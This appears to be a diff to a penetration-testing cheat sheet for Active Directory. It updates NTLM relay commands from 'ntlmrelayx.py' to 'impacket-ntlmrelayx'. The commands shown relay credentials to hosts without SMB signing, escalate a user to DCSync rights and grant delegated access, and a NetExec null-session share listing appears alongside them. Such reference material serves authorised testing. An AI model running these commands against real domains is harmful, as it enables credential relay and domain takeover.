@@ -420,7 +420,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
 
   ### NTLMRelayx
   ```shell
-  sudo python3 ntlmrelayx.py -of <outfile.txt> -tf <nosmbsigning.txt> -smb2support
+  sudo impacket-ntlmrelayx -of <outfile.txt> -tf <nosmbsigning.txt> -smb2support
   ```
 
   ### go-secdump NTLM Relaying
@@ -466,12 +466,12 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
 
   ### NTLMRelayx escalate user to Enterprise Admins (DCSync rights)
   ```shell
-  sudo python3 ntlmrelayx.py -t ldaps://<target> --escalate-user <AD_user>
+  sudo impacket-ntlmrelayx -t ldaps://<target> --escalate-user <AD_user>
   ```
 
   ### NTLMRelayx delegate access
   ```shell
-  sudo python3 ntlmrelayx.py -t ldaps://<target> --delegate-access
+  sudo impacket-ntlmrelayx -t ldaps://<target> --delegate-access
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
